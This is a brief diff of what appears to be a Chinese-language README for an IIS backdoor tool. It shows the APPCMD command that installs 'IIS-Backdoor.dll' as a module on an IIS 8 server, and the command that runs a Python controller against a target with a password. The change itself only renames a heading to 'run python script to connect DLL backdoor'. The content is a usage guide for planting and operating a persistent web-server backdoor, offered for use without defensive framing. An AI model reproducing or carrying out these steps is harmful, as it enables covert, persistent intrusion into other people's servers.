@@ -26,7 +26,7 @@ Windows server2012 IIS 8 测试
 
 PS C:\Users\Administrator> C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module  /image:"c:\IIS-Backdoor.dll" /add:true
 
-### 运行python脚本连接
+### 运行python脚本连接DLL后门
 
 python3 iis_controller.py --url target --password SIMPLEPASS
 
